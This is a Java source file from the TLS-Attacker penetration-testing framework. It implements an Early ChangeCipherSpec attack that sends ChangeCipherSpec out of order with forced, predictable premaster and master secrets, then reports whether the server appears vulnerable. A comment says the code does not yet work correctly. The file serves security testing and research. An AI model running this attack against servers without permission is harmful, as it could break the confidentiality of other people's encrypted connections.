/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.EarlyCCSCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.protocol.message.CertificateMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.tls.protocol.message.ServerHelloMessage;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsConfig;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTraceType;
import de.rub.nds.tlsattacker.tls.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.tls.workflow.action.SendAction;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * TODO: currently does not work correctly, will be fixed after some
 * refactorings.
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(EarlyCCSAttack.class);

    public EarlyCCSAttack(EarlyCCSCommandConfig config) {
        super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
        TlsConfig tlsConfig = configHandler.initialize(config);
        tlsConfig.setWorkflowTraceType(WorkflowTraceType.CLIENT_HELLO);
        TransportHandler transportHandler = configHandler.initializeTransportHandler(tlsConfig);
        TlsContext tlsContext = configHandler.initializeTlsContext(tlsConfig);
        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

        byte[] ms = new byte[48];
        byte[] pms = new byte[48];
        pms[0] = 3;
        pms[1] = 3;

        WorkflowTrace workflowTrace = tlsContext.getWorkflowTrace();
        List<ProtocolMessage> messageList = new LinkedList<>();
        messageList.add(new ServerHelloMessage(tlsConfig));
        messageList.add(new CertificateMessage(tlsConfig));
        messageList.add(new ServerHelloDoneMessage(tlsConfig));
        ReceiveAction receiveAction = new ReceiveAction(messageList);
        workflowTrace.add(receiveAction);
        messageList = new LinkedList<>();
        RSAClientKeyExchangeMessage clientKeyExchange1 = new RSAClientKeyExchangeMessage(tlsConfig);
        messageList.add(clientKeyExchange1);
        ModifiableByteArray modpms = new ModifiableByteArray();
        modpms.setModification(ByteArrayModificationFactory.explicitValue(pms));
        clientKeyExchange1.getComputations().setPlainPaddedPremasterSecret(modpms);
        ModifiableByteArray modms = new ModifiableByteArray();
        modms.setModification(ByteArrayModificationFactory.explicitValue(ms));
        clientKeyExchange1.getComputations().setMasterSecret(modms);
        clientKeyExchange1.setGoingToBeSent(false);
        ChangeCipherSpecMessage changeCipherSpec1 = new ChangeCipherSpecMessage(tlsConfig);
        messageList.add(changeCipherSpec1);
        changeCipherSpec1.setGoingToBeSent(false);
        FinishedMessage fin1 = new FinishedMessage(tlsConfig);
        fin1.setGoingToBeSent(false);

        messageList.add(new ChangeCipherSpecMessage(tlsConfig));

        RSAClientKeyExchangeMessage clientKeyExchange2 = new RSAClientKeyExchangeMessage(tlsConfig);
        messageList.add(clientKeyExchange2);
        modpms = new ModifiableByteArray();
        modpms.setModification(ByteArrayModificationFactory.explicitValue(pms));
        clientKeyExchange2.getComputations().setPlainPaddedPremasterSecret(modpms);
        modms = new ModifiableByteArray();
        modms.setModification(ByteArrayModificationFactory.explicitValue(ms));
        clientKeyExchange2.getComputations().setMasterSecret(modms);
        messageList.add(new FinishedMessage(tlsConfig));
        SendAction sendAction = new SendAction(messageList);
        workflowTrace.add(sendAction);
        messageList = new LinkedList<>();

        messageList.add(new ChangeCipherSpecMessage(tlsConfig));
        messageList.add(new FinishedMessage(tlsConfig));
        receiveAction = new ReceiveAction(messageList);
        workflowTrace.add(receiveAction);
        workflowExecutor.executeWorkflow();
        transportHandler.closeConnection();

        if (workflowTrace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Not vulnerable (probably), no Server Finished message found");
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable (probably), Server Finished message found");
        }
    }
}
